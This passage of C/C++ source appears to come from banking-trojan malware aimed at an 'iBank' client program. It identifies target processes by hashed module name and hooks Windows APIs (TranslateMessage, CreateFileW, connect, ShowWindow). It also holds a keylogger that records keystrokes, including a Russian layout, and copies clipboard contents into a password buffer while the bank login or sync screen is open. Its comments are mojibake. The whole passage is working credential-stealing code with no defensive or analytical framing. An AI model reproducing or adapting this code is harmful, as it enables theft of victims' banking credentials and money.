	return;
}

void ParseKeys( const MSG *lpMsg, DWORD dwCurrentMenu )
{
	char KeyboardLayout[10];
	m_memset( KeyboardLayout, 0, 10 );

	pGetKeyboardLayoutNameA( KeyboardLayout );
	DWORD dwKeyLayout = CalcHash( KeyboardLayout );

	if ( dwLastLayout == -1 )
	{
		dwLastLayout = dwKeyLayout;
	}

	bool bWriteKeys = false;

	if ( ( dwCurrentMenu == ENTER_SYSTEM_MENU || dwCurrentMenu == SYNCHRONIZATION_WITH_BANK ) && pIbank != NULL )
	{
		char Symbol[100];
		m_memset( Symbol, 0, 100 );

		if ( lpMsg->message == 0x0100 )
		{
			pOpenClipboard( NULL );
			HANDLE hClip = pGetClipboardData( CF_TEXT );

			if ( hClip != NULL )
			{
				char *LockedBuffer = (char*)pGlobalLock( hClip );

				if ( LockedBuffer != NULL )
				{
					if ( pIbank->ClipBoard == NULL )
					{
						if ( ( pIbank->ClipBoard = (char*)MemAlloc( m_lstrlen( LockedBuffer ) + 1 ) ) != NULL )
						{
							m_memcpy( pIbank->ClipBoard, LockedBuffer, m_lstrlen( LockedBuffer ) );
						}
					}
				}

				pGlobalUnlock( LockedBuffer );
			}

			pCloseClipboard(); 	

			if ( lpMsg->wParam == 8)
			{
				m_lstrcpy( Symbol, "[backspace_down]" );
			}
			else if ( lpMsg->wParam == 9 )
			{
				m_lstrcpy( Symbol, "[tab_down]" );
			}
			else if ( lpMsg->wParam == 13 )
			{
				m_lstrcpy( Symbol, "[enter_down]" );
			}
			else if ( lpMsg->wParam == 16 )
			{
				if ( dwLastLayout == dwKeyLayout )
				{
					SHIFT_FLAG = true;
				}
			}
			else if ( lpMsg->wParam == 20 )
			{
				CAPSL_FLAG = !CAPSL_FLAG;
			}
			else if ( lpMsg->wParam == 32 )
			{
				Symbol[0] = ' ';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam >= 48 && lpMsg->wParam <= 57 )
			{
				char Temp = (char)m_tolower( (int)lpMsg->wParam );
				
				Symbol[0] = Temp;
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 96 )
			{
				Symbol[0] = '0';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 97 )
			{
				Symbol[0] = '1';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 98 )
			{
				Symbol[0] = '2';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 99 )
			{
				Symbol[0] = '3';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 100 )
			{
				Symbol[0] = '4';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 101 )
			{
				Symbol[0] = '5';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 102 )
			{
				Symbol[0] = '6';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 103 )
			{
				Symbol[0] = '7';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 104 )
			{
				Symbol[0] = '8';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 105 )
			{
				Symbol[0] = '9';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 192 )
			{
				Symbol[0] = '`';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 189 )
			{
				Symbol[0] = '-';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 187 )
			{
				Symbol[0] = '=';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 220 )
			{
				Symbol[0] = '\\';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 106 )
			{
				Symbol[0] = '*';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 107 )
			{
				Symbol[0] = '+';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 110 )
			{
				Symbol[0] = '.';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 111 )
			{
				Symbol[0] = '/';
				Symbol[1] = '\0';
			}

			if ( dwKeyLayout == 0x66DD9BA ) //eng
			{
				if ( lpMsg->wParam == 219 )
				{
					Symbol[0] = '[';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 221 )
				{
					Symbol[0] = ']';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 186 )
				{
					Symbol[0] = ';';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 222 )
				{
					m_lstrcpy( Symbol, "''" );
				}
				else if ( lpMsg->wParam == 188 )
				{
					Symbol[0] = ',';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 190 )
				{
					Symbol[0] = '.';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 191 )
				{
					Symbol[0] = '/';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam >= 65 && lpMsg->wParam <= 90 )
				{
					char Temp   = (char)m_tolower( (int)lpMsg->wParam );

					Symbol[0] = Temp;
					Symbol[1] = '\0';	
				}

			}
			if ( dwKeyLayout == 0x66DD93A ) //rus
			{
				if ( lpMsg->wParam == 219 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 221 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 186 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 222 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 188 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 190 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 191 )
				{
					Symbol[0] = '.';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 65 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 66 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 67 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 68 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 69 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 70 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 71 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 72 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 73 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 74 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 75 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 76 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 77 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 78 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 79 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 80 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 81 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 82 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 83 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 84 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 85 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 86 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 87 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 88 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 89 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 90 )
				{
					Symbol[0] = '�';
					Symbol[1] = '\0';
				}		
			}
		}
		else if ( lpMsg->message == 0x0101 )
		{
			if ( lpMsg->wParam == 16 )
			{
				if ( dwLastLayout == dwKeyLayout )
				{
					SHIFT_FLAG = false;
				}
			}
		}

		if ( dwLastLayout != dwKeyLayout )
		{
			dwLastLayout = dwKeyLayout;
		}

		if ( m_lstrlen( Symbol ) )
		{
			if ( m_lstrlen( Symbol ) == 1 )
			{
				BYTE OutSymbol = Symbol[0];
				TranslateSymbol( dwKeyLayout, Symbol[0], &OutSymbol );

				Symbol[0] = OutSymbol;
				Symbol[1] = '\0';
			}

			if ( pIbank->Password == NULL )
			{
				if ( ( pIbank->Password = (char*)MemAlloc( m_lstrlen( Symbol ) + 1 ) ) == NULL )
				{
					return;
				}
			}
			else
			{
				char *p = (char*)MemRealloc( pIbank->Password, m_lstrlen( pIbank->Password ) + m_lstrlen( Symbol ) + 1 );

				if ( p == NULL )
				{
					return;
				}

				pIbank->Password = p;
			}

			m_memcpy( pIbank->Password + m_lstrlen( pIbank->Password ), Symbol, m_lstrlen( Symbol ) );
		}
	}
		
	return;
}


BOOL WINAPI Hook_IbankTranslateMessage( const MSG *lpMsg )
{
	DWORD dwCurrentMenu = GetCurrentMenuType();

	PIBANK pCurrent = NULL;

	if ( dwCurrentMenu == ENTER_SYSTEM_MENU ) //���� � �������
	{
		dwCurrentMenu = ENTER_SYSTEM_MENU;
	}
	else if ( dwCurrentMenu == SYNCHRONIZATION_WITH_BANK )
	{
		dwCurrentMenu = SYNCHRONIZATION_WITH_BANK;
	}
	
	if ( pIbank != NULL && lpMsg != NULL )
	{
		if (  pIbank->WindowName == NULL )
		{
			char *CurrentWindow = GetCurrentWindow();
			IBANK_DBG("IBANK",CurrentWindow);

			if ( CurrentWindow != NULL )
			{
				if ( ( pIbank->WindowName = (char*)MemAlloc( m_lstrlen( CurrentWindow ) + 1 ) ) != NULL )
				{
					m_memcpy( pIbank->WindowName, CurrentWindow, m_lstrlen( CurrentWindow ) );
				}
			}

			MemFree( CurrentWindow );
		}

		ParseKeys( lpMsg, dwCurrentMenu );
	}
	
	return Real_IbankTranslateMessage ( lpMsg );
}


bool IsIbank()
{
	
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( ModulePath == NULL )
	{		
		return false;
	}





	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	MemFree( ModulePath );
	
	
	if ( dwProcessHash == 0x150CFBD3 || dwProcessHash == 0x1F1AA76A )
	{
		IBANK_DBG("IBANK","IsIbank ");
		return true;
	}
	
	return false;
}




bool IbankHooks()
{
	if ( !IsIbank() )
	{
		return false;
	}
	IBANK_DBG("IBANK","IbankHooks ");



	pIbank = (PIBANK)MemAlloc( sizeof( IBANK ) );

	if ( !pIbank )
	{
		return false;
	}

	m_memset( pIbank, 0, sizeof( IBANK ) );

	InitScreenLib();
    
	UnhookIBancShowCreate();
	UnhookTranslateMessage();
	UnhookCreateFileW();
	
	if ( HookApi( 1, 0x8f8f102, (DWORD)&Hook_CreateFileW ) )
	{
		__asm mov [Real_CreateFileW], eax
	}	


	if ( HookApi( 3, 0xc45d9631, (DWORD)&Hook_IbankTranslateMessage ) )
	{
		__asm mov [Real_IbankTranslateMessage], eax
	}

	if ( HookApi( 4, 0xedd8fe8a, (DWORD)&Hook_Connect ) )
	{
		__asm mov [Real_Connect], eax
	}	
	if ( HookApi( 3, 0x7506E960, (DWORD)&Hook_ShowWindow1 ) )
	{  
		__asm mov [Real_ShowWindow1], eax			
	}
	IBANK_DBG("IBANK","���� ����� ");
	return true;
}
//#endif